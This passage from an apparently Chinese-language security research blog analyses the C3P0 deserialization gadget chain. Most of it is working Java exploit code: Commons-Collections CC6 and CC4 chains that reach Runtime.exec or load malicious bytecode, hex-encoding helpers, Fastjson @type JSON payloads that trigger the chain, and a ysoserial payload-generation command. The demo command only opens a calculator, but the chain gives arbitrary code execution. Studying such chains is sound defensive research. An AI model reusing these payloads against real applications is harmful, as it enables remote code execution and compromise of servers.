class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">fromByteArray</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123; </span><br><span class="line"><span class="type">Object</span> <span class="variable">out</span> <span class="operator">=</span> deserializeFromByteArray( bytes ); </span><br><span class="line"><span class="keyword">if</span> (out <span class="keyword">instanceof</span> IndirectlySerialized)</span><br><span class="line">    <span class="keyword">return</span> ((IndirectlySerialized) out).getObject();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最后到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserializeFromByteArray</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes));</span><br><span class="line"><span class="keyword">return</span> in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>进行反序列化</p><h3 id="gadget-3"><a class="markdownIt-Anchor" href="#gadget-3">#</a> Gadget</h3><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221503290.png" alt="在这里插入图片描述"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource-&gt;</span><br><span class="line">C3P0ImplUtils#parseUserOverridesAsString-&gt;</span><br><span class="line">SerializableUtils#fromByteArray-&gt;</span><br><span class="line">SerializableUtils#deserializeFromByteArray-&gt;</span><br><span class="line">SerializableUtils</span><br></pre></td></tr></table></figure><h3 id="exp-3"><a class="markdownIt-Anchor" href="#exp-3">#</a> EXP</h3><p>这里用 CC4 和 CC6 举例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyVetoException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0Hex_CC6</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">exp</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;Atkx&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;Atkx&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class clazz=LazyMap.class;</span><br><span class="line">        Field factoryField= clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashMap2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;</span><br><span class="line">        sw.write(toHexDigit(h1));</span><br><span class="line">        sw.write(toHexDigit(h2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> out;</span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);</span><br><span class="line">        <span class="comment">//System.err.println(h + &quot;: &quot; + out);</span></span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将类序列化为字节数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//字节数组转十六进制</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">            addHexAscii(bytes[i], sw);</span><br><span class="line">        <span class="keyword">return</span> sw.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> toHexAscii(tobyteArray(exp()));</span><br><span class="line">        System.out.println(hex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Fastjson&lt;1.2.47</span></span><br><span class="line"><span class="comment">//        String payload = &quot;&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;1\&quot;:&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;2\&quot;:&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;&quot;;</span></span><br><span class="line">        <span class="comment">//低版本利用</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0Hex_CC4</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PriorityQueue <span class="title function_">CC4</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesclass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="comment">//name字段</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Atkx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//恶意bytecode字段</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodeFiled</span> <span class="operator">=</span> templatesclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodeFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;H://Code/JavaSecurityCode/cc3/target/classes/calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodeFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//工厂类字段</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>() &#123;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用transformer任意方法的接口,此处通过InstantiateTransformer代替InvokerTransformer</span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123; Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        Transformer[]  transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> priorityQueue;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;</span><br><span class="line">        sw.write(toHexDigit(h1));</span><br><span class="line">        sw.write(toHexDigit(h2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> out;</span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);</span><br><span class="line">        <span class="comment">//System.err.println(h + &quot;: &quot; + out);</span></span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将类序列化为字节数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//字节数组转十六进制</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">            addHexAscii(bytes[i], sw);</span><br><span class="line">        <span class="keyword">return</span> sw.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> toHexAscii(tobyteArray(CC4()));</span><br><span class="line">        System.out.println(hex);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Fastjson&lt;1.2.47</span></span><br><span class="line"><span class="comment">//        String payload = &quot;&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;1\&quot;:&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;2\&quot;:&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;&quot;;</span></span><br><span class="line">        <span class="comment">//低版本利用</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221503169.png" alt="在这里插入图片描述"></p><p>当然也可以使用 CB 链或其他链子</p><p>也可以通过加载反序列化对象来执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar .\ysoserial-all.jar CommonsCollections6 <span class="string">&quot;open -a Calculator&quot;</span> &gt; calc.ser</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0_all</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, 